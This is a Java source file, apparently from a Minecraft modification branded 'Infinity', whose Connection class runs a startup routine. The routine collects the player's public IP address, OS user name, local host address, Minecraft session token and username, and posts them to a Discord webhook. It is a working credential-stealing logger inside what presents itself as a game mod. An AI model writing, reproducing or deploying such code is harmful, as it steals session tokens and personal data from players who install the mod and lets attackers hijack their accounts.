package me.bushroot.logger;

import me.bushroot.logger.config.cfg;
import me.bushroot.logger.webhook.DiscordWebhook;
import net.minecraft.client.Minecraft;

import java.awt.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URL;

public class Connection {
    private static String ip;

    public static void startup() {
        ip = null;

        DiscordWebhook webhook = cfg.connection;

        try {
            URL url = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = in.readLine();
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            webhook.addEmbed(new DiscordWebhook.EmbedObject()
                    .setTitle("Infinity")
                    .setDescription("Minecraft Modification | Connections")
                    .setColor(new Color(0xA800E8))
                    .addField("IP", ip, true)
                    .addField("USER", System.getProperty("user.name"), true)
                    .addField("LOCAL", String.valueOf(InetAddress.getLocalHost()), true)
                    .addField("TOKEN", Minecraft.getMinecraft().getSession().getToken(), true)
                    .addField("MC-NAME", Minecraft.getMinecraft().getSession().getUsername(), true)
                    .addField("Author", "routerMINE", true)


                    .setThumbnail("https://media.discordapp.net/attachments/924953438222155800/969573716570808390/104631337.png"));

            webhook.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
